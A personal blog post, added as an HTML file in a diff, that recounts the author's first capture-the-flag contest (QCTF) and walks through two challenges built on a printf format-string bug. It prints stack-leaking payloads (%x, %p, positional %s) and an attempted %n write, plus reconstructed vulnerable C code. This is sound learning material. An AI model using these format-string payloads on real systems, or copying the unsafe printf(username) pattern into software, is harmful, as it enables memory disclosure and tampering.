@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>QCTF Experience and Write-Up | nikola&#39;s website</title>
+	<link rel="canonical" href="https://nmilo.net/">
+	<link rel='alternate' type='application/rss+xml' title="nikola&#39;s website RSS" href='/index.xml'>
+	<link rel='stylesheet' type='text/css' href='/style.css'>
+	<link rel="icon" href="/favicon.ico">
+	<meta name="description" content="Yesterday I had the opportunity to compete in QCTF, the annual hacking capture-the-flag competition at Queen&rsquo;s University. I came in not expecting much but in the end I was humbled by the challenges and impressed by the competiton. My team of 2 came in 5th place, which is not bad for my first CTF! Next year though I&rsquo;m coming in with a larger team and more preparation.
+The challenges were interesting, and I decided to write-up my solutions for the most difficult ones.">
+	<meta name="keywords" content="programming, c">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="robots" content="index, follow">
+	<meta charset="utf-8">
+</head>
+<body>
+<main>
+<header>
+<center><a href="https://nmilo.net/">home</a></center>
+<hr>
+	<center>
+<h1>QCTF experience and write-up</h1>
+<div style="clear:both" class=taglist><a id="tag_programming" href="https://nmilo.net/tags/programming">#programming</a> &middot; <a id="tag_c" href="https://nmilo.net/tags/c">#c</a></div>
+<div>January 22nd, 2023</div>
+		<div>7 minute read</div>
+	</center>
+</header>
+<article>
+<p>Yesterday I had the opportunity to compete in <a href="https://qctf.ca/">QCTF</a>, the annual hacking capture-the-flag competition at Queen&rsquo;s University. I came in not expecting much but in the end I was humbled by the challenges and impressed by the competiton. My team of 2 came in 5th place, which is not bad for my first CTF! Next year though I&rsquo;m coming in with a larger team and more preparation.</p>
+<p>The challenges were interesting, and I decided to write-up my solutions for the most difficult ones.</p>
+<h2 id="death-string-1">Death String 1</h2>
+<p>We&rsquo;re given an ssh login which provides a username/password login prompt:</p>
+<pre tabindex="0"><code>        ,▄═*5██▐██▀═▄,
+     ,═▀▄█▀▀&#34;▄▄╓▄&#34;▀▀█▄█¥┌
+   ,A▄█▀  ▄▄██████▄▄  ▀█▄▀,
+  ╓▀╙▀▄▄█████▌  ,█████▄▄▀▀/▄
+ ,▀█▀██▄▀`&#34;███  ███▀ ▀█▄█╙█&#34;▄
+ █▐█  ██▄,  `    `  ,▄██L ║▌█
+ ▌█▌ ▐█████▌      ▐█████▌ ▐█▐
+ █▐█  ██⌐   ▄    ▄   `██⌐ █▌█
+  ▌█▌▀▀▄█▄▄███  ███▄╓█▄█▀▄█╓⌐
+   ▄τ█▀└▀████▄,,▄████▀╙▀▄M▄^
+    ▀▄▀█▄ `▀▀██╫█▀▀└ ,▄██╛
+      ╙═█▀█▄▄▄█║█▄▄█▀█æ╙
+         &#39;&#34;ⁿ══==══ⁿ&#34;└
+
+   Imperial Security Bureau
+
+username: admin
+password: password
+
+Welcome admin.
+
+Access denied: Invalid username or password. If you have forgotten your password,
+you can use an emergency override code instead.
+</code></pre><p>Immediately I see the username is echoed back, so I&rsquo;m thinking this could be a <code>printf</code>-exploitation challenge, so I put some format specifiers in the username to test.</p>
+<pre tabindex="0"><code>username: %x%x%x%x%x%x%x
+password: password
+
+Welcome 636c65576b5600636c65576b78808ffffeb00ffffec00.
+</code></pre><p>Nice! I&rsquo;m guessing the flag is stored as a character array somewhere in the program&rsquo;s data section, and hopefully, there&rsquo;s a pointer to that string somewhere on the stack, so I print out all the pointers I can.</p>
+<pre tabindex="0"><code>username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
+password: 
+
+Welcome 0x20656d6f636c6557 0x6b5600 0x20656d6f636c6557 0x6b7880 0x8
+0x7fffffffeb00 0x7fffffffec00 0x3433647b46544351 0x7d723474736874
+0x7fffffffeac0 0x6b4bc0 0x7fffffffed10 0x400dea 0x7fffffffee58
+0x1006b81c0 (nil) 0x5 0x45 0x70 0x1 0x3100000005 (nil) (nil)
+0x6e0000005b (nil) (nil) 0x7c00000077 0x6b3800 0x6b3800 0x45 0x1
+0x7fffffffebc0 (nil) 0x2 0x413d61 0x2 0x4 0x7fffffffec80 0x460bdb
+0x7fffffffefc9 (nil) 0x49e4d1 0x15 0x140 0x170 0x5 0x3500000015
+0x7025207025207025 0x2520702520702520 0x2070252070252070
+0x7025207025207025 0x2520702520702520 0x2070252070252070
+0x7025207025207025 0x2520702520702520 0x2070252070252070
+0x7025207025207025 0x2520702520702520 0x2070252070252070
+0x7025207025207025 0x2520702520702520 0x2070252070252070
+0x7025207025207025 0x2520702520702520 .
+</code></pre><p>Wow, that&rsquo;s a lot of data! I used vim to clean in up into a form that I can import into my hex editor, and I start looking for things that might look like pointers.</p>
+<p><img src="/qctf/hexfiend.png" alt=""></p>
+<p>Of course, on the right we have the format string, since it must be loaded onto the stack too while printf is being executed, and, wait, what is that above? FTCQ? I happen to know that flags have the format QCTF{&hellip;}, and since we&rsquo;re in little endian it will appear reversed. So the flag isn&rsquo;t stored in a <code>char *</code>, it&rsquo;s stored directly on the stack. We can try a new query, but I&rsquo;m just gonna reverse the bytes manually. Converting <code>3433647B46544351 007D723474736874</code> to big-endian gives <code>514354467B643334 7468737434727D00</code>, which is <code>QCTF{d34thst4r}</code> in ASCII. And that&rsquo;s the flag!</p>
+<h2 id="death-string-2">Death String 2</h2>
+<p>This challenge reuses the same login prompt from Death String 1 but now we need to find a way to log in using the mentioned &ldquo;emergency override code.&rdquo; We&rsquo;re also given the hint that &ldquo;A pointer to the emergency access code is stored in a stack variable.&rdquo;</p>
+<p>Stack variable have very distinct patterns, and on this machine, I&rsquo;m guessing pointers to the stack generally start at <code>0x7fffffff0000</code>. So I look at the prompt I used above and replace every <code>%p</code> with a <code>%s</code> to print the content of each stack-pointer as a string, which lets me fill out this table:</p>
+<table>
+<thead>
+<tr>
+<th>position in the format string</th>
+<th>pointer value</th>
+<th>content as string</th>
+<th>guess</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>6</td>
+<td>0x00007FFFFFFFEB00</td>
+<td></td>
+<td>empty string or non-printable characters</td>
+</tr>
+<tr>
+<td>7</td>
+<td>0x00007FFFFFFFEC00</td>
+<td>%p %p %p %p %p &ldquo;%s&rdquo; &ldquo;%s&rdquo; %p %p &ldquo;%s&rdquo; %p &ldquo;%s&rdquo; %p &ldquo;%s&rdquo; %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p &ldquo;%s&rdquo; %p %p %p %p %p &ldquo;%s&rdquo; %p &ldquo;%s&rdquo; %p %p %p %p %p %p %p %p %p %p %p %p</td>
+<td>pointer to the format string</td>
+</tr>
+<tr>
+<td>10</td>
+<td>0x00007FFFFFFFEAC0</td>
+<td>QCTF{d34thst4r}</td>
+<td>flag 1</td>
+</tr>
+<tr>
+<td>12</td>
+<td>0x00007FFFFFFFED10</td>
+<td>0k</td>
+<td></td>
+</tr>
+<tr>
+<td>14</td>
+<td>0x00007FFFFFFFEE58</td>
+<td>?????</td>
+<td>GNU printf print failure? Or the literal string &ldquo;?????&rdquo;</td>
+</tr>
+<tr>
+<td>32</td>
+<td>0x00007FFFFFFFEBC0</td>
+<td>?????</td>
+<td>same</td>
+</tr>
+<tr>
+<td>38</td>
+<td>0x00007FFFFFFFEC80</td>
+<td>&ldquo;%s&rdquo; %p &ldquo;%s&rdquo; %p %p %p %p %p %p %p %p %p %p %p %p</td>
+<td>portion of the format string</td>
+</tr>
+<tr>
+<td>40</td>
+<td>0x00007FFFFFFFEFC9</td>
+<td>x86_64</td>
+<td>architecture</td>
+</tr>
+</tbody>
+</table>
+<p>A few notes:</p>
+<ul>
+<li>so a pointer to flag 1 is indeed stored on the stack, we could have used this method to solve part 1</li>
+<li>I&rsquo;m guessing everything at pointer 32 and on is part of the printf function&rsquo;s stack, so we&rsquo;re not interested
+<ul>
+<li>considering it holds a substring of the format string, it likely has some logic like this,</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#458;font-weight:bold">int</span> <span style="color:#900;font-weight:bold">printf</span>(<span style="color:#458;font-weight:bold">char</span> fmt, ...) {
+</span></span><span style="display:flex;"><span>	<span style="color:#000;font-weight:bold">while</span> (<span style="color:#099">1</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#900;font-weight:bold">format_the_specifier</span>(fmt, args);
+</span></span><span style="display:flex;"><span>		fmt <span style="color:#000;font-weight:bold">+=</span> length_of_specifier;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>this makes sense, since when it prints word 38, the <code>fmt</code> pointer in the pseudocode above would on the 2nd last <code>&quot;%s&quot;</code></li>
+<li><code>&quot;x86_64&quot;</code> is likely part of printf too, maybe there&rsquo;s some way to get printf to print the architecture? Or is this a GNU extension? Weird either way.</li>
+</ul>
+<p>We can get a cleaner version of the output above by using the prompt:</p>
+<pre tabindex="0"><code>&#34;%6$s&#34; &#34;%7$s&#34; &#34;%10$s&#34; &#34;%12$s&#34; %14$s&#34;
+</code></pre><p>which takes advantage of printf&rsquo;s rarely used positional formatting specifiers.</p>
+<p>Hacking away with precision specifiers, and writing to the pointers with <code>%n</code>, I can get a better understanding of what the pointers point to. And yes, at <code>0x7FFFFFFFEE58</code> there really is a literal <code>&quot;?????&quot;</code>, and that&rsquo;s not part of <code>printf</code>.</p>
+<table>
+<thead>
+<tr>
+<th>position in the format string</th>
+<th>pointer value</th>
+<th>what it points to</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>6</td>
+<td>0x00007FFFFFFFEB00</td>
+<td>the password we type</td>
+</tr>
+<tr>
+<td>7</td>
+<td>0x00007FFFFFFFEC00</td>
+<td>the username we type</td>
+</tr>
+<tr>
+<td>10</td>
+<td>0x00007FFFFFFFEAC0</td>
+<td>&ldquo;QCTF{d34thst4r}&rdquo; (the flag)</td>
+</tr>
+<tr>
+<td>12</td>
+<td>0x00007FFFFFFFED10</td>
+<td>&ldquo;0k&rdquo;</td>
+</tr>
+<tr>
+<td>14</td>
+<td>0x00007FFFFFFFEE58</td>
+<td>&ldquo;?????&rdquo;</td>
+</tr>
+</tbody>
+</table>
+<p>Here I got stumped, so I got another hint, and it told me, &ldquo;printf can write too,&rdquo; which is something I already knew but still helpful since I now knew the challenge involved somehow overwriting the access code. My guess is that the program looks something like this:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#000;font-weight:bold">const</span> <span style="color:#458;font-weight:bold">char</span> <span style="color:#000;font-weight:bold">*</span>flag2 <span style="color:#000;font-weight:bold">=</span> <span style="color:#d14">&#34;...&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#458;font-weight:bold">int</span> <span style="color:#900;font-weight:bold">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#458;font-weight:bold">char</span> access_code_array[<span style="color:#099">6</span>] <span style="color:#000;font-weight:bold">=</span> <span style="color:#d14">&#34;?????&#34;</span>;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#458;font-weight:bold">char</span> <span style="color:#000;font-weight:bold">*</span>username <span style="color:#000;font-weight:bold">=</span> <span style="color:#900;font-weight:bold">prompt</span>(<span style="color:#d14">&#34;username: &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#458;font-weight:bold">char</span> <span style="color:#000;font-weight:bold">*</span>password <span style="color:#000;font-weight:bold">=</span> <span style="color:#900;font-weight:bold">prompt</span>(<span style="color:#d14">&#34;password: &#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#458;font-weight:bold">char</span> <span style="color:#000;font-weight:bold">*</span>access_code <span style="color:#000;font-weight:bold">=</span> access_code_array;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#900;font-weight:bold">printf</span>(<span style="color:#d14">&#34;Welcome &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#900;font-weight:bold">printf</span>(username);
+</span></span><span style="display:flex;"><span>	<span style="color:#900;font-weight:bold">printf</span>(<span style="color:#d14">&#34;.&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#000;font-weight:bold">if</span> (<span style="color:#900;font-weight:bold">strcmp</span>(password, access_code) <span style="color:#000;font-weight:bold">==</span> <span style="color:#099">0</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#000;font-weight:bold">&amp;&amp;</span> <span style="color:#900;font-weight:bold">strlen</span>(access_code) <span style="color:#000;font-weight:bold">&gt;</span> <span style="color:#099">0</span> <span style="color:#998;font-style:italic">// to prevent overwriting the access code with
+</span></span></span><span style="display:flex;"><span><span style="color:#998;font-style:italic"></span>								   <span style="color:#998;font-style:italic">// an empty string
+</span></span></span><span style="display:flex;"><span><span style="color:#998;font-style:italic"></span>		<span style="color:#000;font-weight:bold">&amp;&amp;</span> access_code[<span style="color:#099">0</span>] <span style="color:#000;font-weight:bold">!=</span> <span style="color:#d14">&#39;?&#39;</span>   <span style="color:#998;font-style:italic">// to prevent just typing &#34;?????&#34; into the
+</span></span></span><span style="display:flex;"><span><span style="color:#998;font-style:italic"></span>								   <span style="color:#998;font-style:italic">// password field
+</span></span></span><span style="display:flex;"><span><span style="color:#998;font-style:italic"></span>	) {
+</span></span><span style="display:flex;"><span>		<span style="color:#900;font-weight:bold">printf</span>(<span style="color:#d14">&#34;welcome, here&#39;s the flag: %s</span><span style="color:#d14">\n</span><span style="color:#d14">&#34;</span>, flag2);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>A little contrived, but it&rsquo;s a CTF, what do you want. It&rsquo;s clear I have to set the access code to something I know and then put that for the password. I use <code>%n</code> to overwrite the code. <code>%n</code> tells printf not to print the next pointer but instead treat it as an <code>int *</code> and write to it the number of characters already written to <code>stdout</code>. So I have to write, say, 65 characters to stdout, and then <code>%14$n</code>, which writes a 65, or 0x41, or &lsquo;A&rsquo;, to the 14th pointer down the stack. Better yet, it will treat the <code>char *</code> like an <code>int *</code>, so it will actually write <code>0x00000041</code>, which if interpreted as a character array on a little-endian machine, effectively writes <code>{0x41, 0, 0, 0}</code>, which means I get the null-terminator written for free! So here&rsquo;s my prompt, let&rsquo;s hope it works:</p>
+<pre tabindex="0"><code>username: aaaaa... (65 characters total) ...aaaaa%14$n
+password: A
+</code></pre><p>And&hellip;. it didn&rsquo;t work. It was at this point that time ran out and we disappointingly placed in 5th, when this 200-point challenge would have brought us to into the top 3 for that sweet, sweet cash prize. Oh well. Maybe the solution has something to do with that <code>0k</code> string in pointer 12. I&rsquo;ll have to wait and see the official solutions.</p>
+<hr>
+<div class="nextprev">
+<a href="/articles/coroutines/"><div class="prevart">&lt;&lt;&lt; prev<br>C&#43;&#43;20 coroutines explained simply</div></a>
+<a href="/articles/overloading/"><div class="nextart">&gt;&gt;&gt; next<br>C has overloading, actually</div></a>
+</div>
+</main>
+<footer>
+	<a href="https://nmilo.net/">home</a><br><br>
+	<a href="/index.xml"><img src="/rss.svg" style="max-height:1.5em" alt="RSS Feed" title="Subscribe via RSS for updates."></a>
+</footer>
+</body>
+</html>
+
